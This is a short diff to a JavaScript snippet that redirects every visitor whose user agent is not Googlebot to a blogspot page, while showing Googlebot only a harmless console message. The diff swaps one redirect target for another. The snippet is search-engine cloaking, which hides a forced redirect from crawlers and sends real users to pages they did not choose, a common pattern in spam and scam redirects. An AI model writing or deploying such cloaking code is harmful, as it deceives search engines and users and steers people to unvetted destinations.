@@ -1,6 +1,6 @@
 
 if (!navigator.userAgent.includes('Googlebot')) {
-  window.location.href = "https://gud-marani.blogspot.com/2026/11/novex.html";
+  window.location.href = "https://gud-marani.blogspot.com/2026/11/hol.html";
 } else {
   console.log("Thanks for visiting my page" );
 }
